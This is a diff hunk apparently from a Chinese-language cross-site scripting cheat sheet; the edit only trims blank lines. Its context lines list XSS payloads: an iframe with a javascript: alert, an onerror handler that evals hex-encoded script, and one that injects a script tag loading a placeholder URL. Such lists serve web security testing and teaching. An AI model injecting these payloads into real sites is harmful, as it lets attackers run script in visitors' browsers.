@@ -45,5 +45,4 @@
     使用框架来执行脚本：	<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>
     使用eval绕过：		<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>
     创建元素：			<img src=x onerror=appendChild(createElement('script')).src='js_url' />
-
-
+   
